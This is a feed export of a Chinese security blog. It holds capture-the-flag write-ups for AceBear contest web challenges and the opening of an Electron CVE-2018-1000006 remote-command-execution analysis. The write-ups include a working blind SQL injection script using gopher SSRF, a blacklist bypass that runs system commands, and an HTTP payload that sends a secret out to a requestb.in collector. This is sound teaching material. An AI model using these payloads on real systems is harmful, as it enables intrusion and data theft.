class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">(payload)</span>:</span></div><div class="line">	result = [payload[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(payload),<span class="number">2</span>)]</div><div class="line">	<span class="keyword">return</span> binascii.b2a_hex(<span class="string">b"gopher://127.0.0.1:3306/_%"</span>+<span class="string">"%"</span>.join(result))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	flag = <span class="string">""</span></div><div class="line">	url = <span class="string">"http://128.199.179.156/info.php"</span></div><div class="line">	cookie = &#123;</div><div class="line">		<span class="string">'PHPSESSID'</span>:<span class="string">'av7963h17c1qukv4jm4gklvoi1'</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">127</span>,<span class="number">32</span>,<span class="number">-1</span>):</div><div class="line">			<span class="keyword">print</span> <span class="string">'j:'</span>+str(j)</div><div class="line">			query = <span class="string">"select * from flag.flag where IF(ascii(substr((select * from flag.flag),%s,1)) =%s,sleep(5),1);"</span> % (str(i),str(j))</div><div class="line">			uid = <span class="string">"?uid=%1$'%20union%20select%201,1,0x"</span> + result(gen_payload(query)) + <span class="string">"%23"</span></div><div class="line">			fullurl = url + uid</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				r = requests.get(fullurl,cookies=cookie,timeout=<span class="number">5</span>)</div><div class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">				flag += chr(j)</div><div class="line">				print(flag)</div><div class="line">				i = i+<span class="number">1</span></div><div class="line">				<span class="keyword">break</span></div><div class="line">	print(flag)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	exp()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/12.jpg?raw=true" alt=""></p>
<p>访问：<a href="https://tinyurl.com/y9pplum3" target="_blank" rel="external">https://tinyurl.com/y9pplum3</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/13.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AceBear&#123;Just_WP_SQLi_and_some_SSRF_tricks&#125;</div></pre></td></tr></table></figure></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://paper.seebug.org/386/" target="_blank" rel="external">wordpress 格式化字符串sql注入漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/#%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2sql%E6%B3%A8%E5%85%A5">LCTF 2017-Simple blog-writeup </a></li>
<li><a href="https://mp.weixin.qq.com/s/9vk-H36erencugdYca9qXA" target="_blank" rel="external">SSRF To RCE in MySQL </a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于：&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/2013&quot;&gt;阿里先知安全社区：AceBear Security Contest-Tet shopping-writeup&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>AceBear Security Contest-部分Web-writeup</title>
    <link href="http://chybeta.github.io/2018/01/29/AceBear-Security-Contest-%E9%83%A8%E5%88%86Web-writeup/"/>
    <id>http://chybeta.github.io/2018/01/29/AceBear-Security-Contest-部分Web-writeup/</id>
    <published>2018-01-29T01:16:06.000Z</published>
    <updated>2018-01-29T06:19:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>AceBear Security Contest-部分Web-writeup<br><a id="more"></a></p>
<h1 id="Urlparameter"><a href="#Urlparameter" class="headerlink" title="Urlparameter"></a>Urlparameter</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Description: this chall sucks, you should watch VIE vs UZB match. :) VIET NAM VO DICH!</div><div class="line">Author: kad96</div><div class="line">Website: Link http://35.196.45.11:8080/</div></pre></td></tr></table></figure>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>存在robots.txt： <a href="http://35.196.45.11:8080/robots.txt" target="_blank" rel="external">http://35.196.45.11:8080/robots.txt</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/1.jpg?raw=true" alt=""></p>
<p>访问： <a href="http://35.196.45.11:8080/?debug" target="_blank" rel="external">http://35.196.45.11:8080/?debug</a> 获得源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$blacklist = <span class="string">"assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(count($_GET) &gt; <span class="number">0</span>)&#123;</div><div class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/$blacklist/i"</span>,$_SERVER[<span class="string">"REQUEST_URI"</span>])) <span class="keyword">die</span>(<span class="string">"No no no hackers!!"</span>);</div><div class="line">	<span class="keyword">list</span>($key, $val) = each($_GET);</div><div class="line">	$key($val);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>可以看到，在检测时使用了<code>$_SERVER[&quot;REQUEST_URI&quot;]</code>以及黑名单，接着的获取则使用了<code>$_GET</code>。在<a href="http://php.net/manual/zh/reserved.variables.get.php" target="_blank" rel="external">php手册</a>中:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/2.jpg?raw=true" alt=""></p>
<p>也即 <code>$_GET</code>会对传入的参数先进行了一次urldecode()，之后再返回，而<code>$_SERVER[&quot;REQUEST_URI&quot;]</code>会直接返回。所以访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://35.196.45.11:8080/?syste%6d=ls</div></pre></td></tr></table></figure></p>
<p>对于<code>$_SERVER[&quot;REQUEST_URI&quot;]</code>，值为<code>syste%6d</code>，绕过了黑名单检测。对于<code>$_GET</code>，则为<code>system</code>，最后实际实行的即为<code>system(&quot;ls&quot;)</code>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/3.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://35.196.45.11:8080/?system=head flag-a-long-name-that-you-wont-know.php</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/4.jpg?raw=true" alt=""></p>
<p>关于接受query-string与编码的问题，可以看看这篇：<a href="https://security.elarlang.eu/request-uri-query-string-and-url-encoding.html" target="_blank" rel="external">Request URI, Query String and URL encoding </a></p>
<h1 id="BearShare"><a href="#BearShare" class="headerlink" title="BearShare"></a>BearShare</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Description: I have an idea, I want to change the way we communicate.</div><div class="line">Website: Link http://35.198.201.83/</div></pre></td></tr></table></figure>
<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>先简单的过一下功能。在 <a href="http://35.198.201.83/index.php" target="_blank" rel="external">http://35.198.201.83/index.php</a> 页面，你可在<code>Your private message</code>处填入信息，然后页面返回信息保存的位置（stored at server）以及相应的id。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/6.jpg?raw=true" alt=""></p>
<p>在 <a href="http://35.198.201.83/download.php" target="_blank" rel="external">http://35.198.201.83/download.php</a> 页面，你可以选择server，并填入相应的id，然后读出之前存入的信息。页面返回的是一个html页面代码。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/7.jpg?raw=true" alt=""></p>
<p>经过探测发现有robots.txt，<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/5.jpg?raw=true" alt=""></p>
<p>访问 <a href="http://35.198.201.83/backup_files" target="_blank" rel="external">http://35.198.201.83/backup_files</a> ，获得index.txt与download.txt，它们分别是index.php与download.php的源码。部分关键代码如下</p>
<p>index.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>   </div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>]))&#123;</div><div class="line">        $message = (string)$_POST[<span class="string">'message'</span>];</div><div class="line">        $rand_id = rand(<span class="number">1000000000</span>, <span class="number">9999999999</span>).<span class="string">'salt^&amp;#@!'</span>.rand(<span class="number">1000000000</span>, <span class="number">9999999999</span>);</div><div class="line">	$messid = md5($rand_id);</div><div class="line">	$store_location = rand(<span class="number">0</span>,<span class="number">10</span>);</div><div class="line">	<span class="keyword">if</span>($store_location%<span class="number">2</span>===<span class="number">0</span>)&#123;</div><div class="line">		file_put_contents(<span class="string">'/var/www/messagestore/'</span>.$messid,$message);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		file_put_contents(<span class="string">'/var/www/messagestore2/'</span>.$messid,$message);</div><div class="line">	&#125;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>download.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">include_once</span> <span class="string">'config.php'</span>;</div><div class="line">    $nonce = md5(rand(<span class="number">10000000</span>, <span class="number">99999999</span>).rand(<span class="number">10000000</span>, <span class="number">99999999</span>));</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gen_hash</span><span class="params">($n, $sv)</span></span>&#123;</div><div class="line">	$first = hash_hmac(<span class="string">'sha256'</span>,$n,$S_KEY);</div><div class="line">	<span class="keyword">return</span> hash_hmac(<span class="string">'sha256'</span>,$sv,$first);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate_hash</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'hash'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'storagesv'</span>]))&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'Cannot verify server'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'nonce'</span>]))&#123;</div><div class="line">            $S_KEY = hash_hmac(<span class="string">'sha256'</span>,$_POST[<span class="string">'nonce'</span>],$S_KEY);</div><div class="line">        &#125;</div><div class="line">        $final_hash = hash_hmac(<span class="string">'sha256'</span>,$_POST[<span class="string">'storagesv'</span>],$S_KEY);</div><div class="line">        <span class="keyword">if</span> ($final_hash !== $_POST[<span class="string">'hash'</span>])&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'Cannot verify server'</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($x)</span></span>&#123;</div><div class="line">        $x = (string)$x;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|\@|\s|:|\/\//mi'</span>,$x))&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> $x;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'messid'</span>]))&#123;</div><div class="line"></div><div class="line">	$messid = $_POST[<span class="string">'messid'</span>];</div><div class="line">	validate_hash();</div><div class="line">	$url=<span class="string">""</span>;</div><div class="line">	<span class="keyword">if</span>($_POST[<span class="string">'storagesv'</span>] === <span class="string">'message1.local'</span> <span class="keyword">or</span> $_POST[<span class="string">'storagesv'</span>] === <span class="string">'message2.local'</span>)&#123;</div><div class="line">		$url = <span class="string">'http://'</span>.$_POST[<span class="string">'storagesv'</span>].<span class="string">'/'</span>;</div><div class="line">	&#125; <span class="keyword">elseif</span> ($_POST[<span class="string">'storagesv'</span>]===<span class="string">"gimmeflag"</span>) &#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'AceBear&#123;******&#125;'</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$messid = filter($messid);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($messid)&#123;</div><div class="line">	  $url .= $messid;</div><div class="line">          $out = shell_exec(<span class="string">'/usr/bin/python '</span>.$BROWSER_BOT.<span class="string">' '</span>.escapeshellarg(<span class="string">'http://route.local/?url='</span>.urlencode($url)).<span class="string">' 2&gt;&amp;1'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'Hey, are you a haxor?'</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>接下来审计一波。可以看到flag在：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_POST[<span class="string">'storagesv'</span>] === <span class="string">'message1.local'</span> <span class="keyword">or</span> $_POST[<span class="string">'storagesv'</span>] === <span class="string">'message2.local'</span>)&#123;</div><div class="line">	$url = <span class="string">'http://'</span>.$_POST[<span class="string">'storagesv'</span>].<span class="string">'/'</span>;</div><div class="line">&#125; <span class="keyword">elseif</span> ($_POST[<span class="string">'storagesv'</span>]===<span class="string">"gimmeflag"</span>) &#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'AceBear&#123;******&#125;'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在此之前，经过了validate_hash()的验证，会将传入的<code>$_POST[&#39;storagesv&#39;]</code>进行<code>hash_hmac</code>操作，将得到的<code>$final_hash</code>进行比较，即比较条件为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hash_hmac(<span class="string">'sha256'</span>,$_POST[<span class="string">'storagesv'</span>], hash_hmac(<span class="string">'sha256'</span>,$_POST[<span class="string">'nonce'</span>],$S_KEY) ) !== $_POST[<span class="string">'hash'</span>]</div></pre></td></tr></table></figure></p>
<p>在这个比较条件中，<code>$S_KEY</code>是定义在config.php是未知的，但我们有三个参数可控。<a href="http://php.net/manual/zh/function.hash-hmac.php" target="_blank" rel="external">hash_hmac</a>使用 HMAC 方法生成带有密钥的哈希值，例如此处使用了sha256算法。我们知道在php中md5算法、sha256算法等无法处理数组，这个trick通常来绕过<code>if(@md5($_GET[&#39;a&#39;]) === @md5($_GET[&#39;b&#39;]))</code>，因为当传入参数为数组时，返回值是NULL，造成了<code>NULL===NULL</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$S_KEY = <span class="string">"UNKNOWN"</span>;</div><div class="line"><span class="keyword">if</span> (hash_hmac(<span class="string">'sha256'</span>,$_POST[<span class="string">'nonce'</span>],$S_KEY) === <span class="keyword">NULL</span> )</div><div class="line">	<span class="keyword">echo</span> <span class="string">"Hello,chybeta!"</span>;</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/8.jpg?raw=true" alt=""></p>
<p>所以我们传入<code>$_POST[&#39;nonce&#39;]</code>为<code>nonce[]=1</code>，则此时比较条件变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hash_hmac(&apos;sha256&apos;,$_POST[&apos;storagesv&apos;], NULL ) !== $_POST[&apos;hash&apos;]</div></pre></td></tr></table></figure></p>
<p>此时我们即可伪造hash和storagesv了，<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/9.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/10.jpg?raw=true" alt=""></p>
<h1 id="BearShare-level-2"><a href="#BearShare-level-2" class="headerlink" title="BearShare level 2"></a>BearShare level 2</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Description: Well, there is one more thing. After get flag in level 1, try to discover 1 more.</div><div class="line">Website: Link http://35.198.201.83/</div></pre></td></tr></table></figure>
<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><p>这题的连接和前面一样，我们继续在前面的源码上进行探索。在download.php 中有这样一部分代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment"># line 24</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($x)</span></span>&#123;</div><div class="line">	$x = (string)$x;</div><div class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/http|https|\@|\s|:|\/\//mi'</span>,$x))&#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> $x;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># line 35</span></div><div class="line">$messid = $_POST[<span class="string">'messid'</span>];</div><div class="line">validate_hash();</div><div class="line"></div><div class="line">$url=<span class="string">""</span>;</div><div class="line"><span class="keyword">if</span>($_POST[<span class="string">'storagesv'</span>] === <span class="string">'message1.local'</span> <span class="keyword">or</span> $_POST[<span class="string">'storagesv'</span>] === <span class="string">'message2.local'</span>)&#123;</div><div class="line">	$url = <span class="string">'http://'</span>.$_POST[<span class="string">'storagesv'</span>].<span class="string">'/'</span>;</div><div class="line">&#125; <span class="keyword">elseif</span> ($_POST[<span class="string">'storagesv'</span>]===<span class="string">"gimmeflag"</span>) &#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'AceBear&#123;******&#125;'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$messid = filter($messid);</div><div class="line"></div><div class="line"><span class="keyword">if</span>($messid)&#123;    </div><div class="line">  $url .= $messid;</div><div class="line">	  $out = shell_exec(<span class="string">'/usr/bin/python '</span>.$BROWSER_BOT.<span class="string">' '</span>.escapeshellarg(<span class="string">'http://route.local/?url='</span>.urlencode($url)).<span class="string">' 2&gt;&amp;1'</span>);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'Hey, are you a haxor?'</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>根据我们传入的参数，构造<code>$url</code>，然后控制<code>$BROWSER_BOT</code>去访问<code>http://route.local/?url=urlencode($url)</code>对应的页面，然后将结果输出。这也解释了为什么前面读取信息时返回的是一个html页面代码，而不是仅仅一条信息。由于这里使用了<a href="http://php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="external">escapeshellarg</a>，单引号无法逃逸，因此任意命令执行时不存在的。结合代码功能，我们猜想SSRF攻击。</p>
<p>结合这个比赛的“特点”，比如第一题和第二题的信息都是从robots.txt里泄露的，所以我们尝试访问内网的robots.txt，也即我们尝试请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://route.local/?url=robots.txt&apos;;</div></pre></td></tr></table></figure></p>
<p>利用前面的脚本更改一下storagesv的值以及对应hash，绕过判断以及die语句。构造参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">nonce[]=chybeta</div><div class="line">hash=43b0cef99265f9e34c10ea9d3501926d27b39f57c6d674561d8ba236e7a819fb</div><div class="line">storagesv=test</div><div class="line">messid=robots.txt</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/11.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/12.jpg?raw=true" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</div><div class="line">		        $url = (string)$_GET[<span class="string">'url'</span>];</div><div class="line">			header(<span class="string">'Location: '</span>.$url.<span class="string">'?flag=***SECRET***:'</span>);</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
<p>当url接收到对应的参数时，会通过重定向将flag发出去。借鉴第一题，如果我们传入<code>%2568ttp://</code>，即可绕过filter。最终payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /download.php HTTP/1.1</div><div class="line">Host: 35.198.201.83</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 170</div><div class="line">Referer: http://35.198.201.83/download.php</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">nonce[]=chybeta&amp;hash=43b0cef99265f9e34c10ea9d3501926d27b39f57c6d674561d8ba236e7a819fb&amp;storagesv=test&amp;messid=index.php?url=%2568ttps%253A%252f%252frequestb.in%252f1e93f3m1</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180129/13.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AceBear Security Contest-部分Web-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>[CVE-2018-1000006]Electron &lt;= v1.8.2-beta.4 远程命令执行漏洞</title>
    <link href="http://chybeta.github.io/2018/01/24/CVE-2018-1000006-Electron-v1-8-2-beta-4-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://chybeta.github.io/2018/01/24/CVE-2018-1000006-Electron-v1-8-2-beta-4-远程命令执行漏洞/</id>
    <published>2018-01-24T12:29:34.000Z</published>
    <updated>2018-02-03T11:42:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于<a href="https://xianzhi.aliyun.com/forum/topic/1990" target="_blank" rel="external">阿里先知安全社区：Electron &lt; v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】</a></p>
<a id="more"></a>
<h1 id="Electron"><a href="#Electron" class="headerlink" title="Electron"></a>Electron</h1><p>Electron是基于Chromium 和Node.js，并使用HTML、JS、CSS来构建应用的框架。项目地址：<a href="https://github.com/electron/electron" target="_blank" rel="external">https://github.com/electron/electron</a> 。在1月22日，官方发布了对漏洞的通告<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/1.jpg?raw=true" alt=""></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>从上述通告可知，该漏洞有两个要点：</p>
<ol>
<li>基于electron构建的app登记了协议，即可以使用该协议直接打开应用程序。</li>
<li>影响win平台</li>
</ol>
<p>可以直接从<a href="https://github.com/CHYbeta/CVE-2018-1000006-DEMO" target="_blank" rel="external">CHYbeta/CVE-2018-1000006-DEMO</a>获取环境，以下部分即可忽略。</p>
<p>新建一个文件夹比如test，里面新建三个文件main.js，index.html，package.json：</p>
<p>main.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> &#123;app, BrowserWindow&#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>)</div><div class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</div><div class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</div><div class="line"><span class="keyword">const</span> dialog = <span class="built_in">require</span>(<span class="string">'electron'</span>).dialog</div><div class="line"><span class="keyword">let</span> win</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWindow</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  win = <span class="keyword">new</span> BrowserWindow(&#123;<span class="attr">width</span>: <span class="number">800</span>, <span class="attr">height</span>: <span class="number">600</span>&#125;)</div><div class="line">  win.loadURL(url.format(&#123;</div><div class="line">    <span class="attr">pathname</span>: path.join(__dirname, <span class="string">'index.html'</span>),</div><div class="line">    <span class="attr">protocol</span>: <span class="string">'file:'</span>,</div><div class="line">    <span class="attr">slashes</span>: <span class="literal">true</span></div><div class="line">  &#125;))</div><div class="line">  win.on(<span class="string">'closed'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    win = <span class="literal">null</span></div><div class="line">  &#125;)</div><div class="line">&#125;</div><div class="line">app.on(<span class="string">'ready'</span>, createWindow)</div><div class="line">app.on(<span class="string">'window-all-closed'</span>, () =&gt; &#123;</div><div class="line">  <span class="keyword">if</span> (process.platform !== <span 